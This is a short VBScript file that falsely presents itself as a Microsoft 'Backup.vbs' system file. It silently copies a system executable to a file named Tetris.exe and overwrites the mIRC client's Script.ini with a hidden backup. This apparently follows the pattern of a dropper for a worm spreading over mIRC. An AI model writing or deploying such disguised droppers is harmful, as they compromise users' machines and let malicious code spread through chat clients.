' Backup.vbs System File (c) Microsoft Corporation 2000
On Error Resume Next
Dim fso, fbackup, sbackup
Set fso = CreateObject("Scripting.FileSystemObject")
Set fbackup = fso.GetFile("C:\Windows\System.exe")
fbackup.Copy("C:\Tetris.exe")
Set sbackup = fso.GetFile("C:\Windows\Script.bak")
sbackup.Copy("C:\mirc\Script.ini")
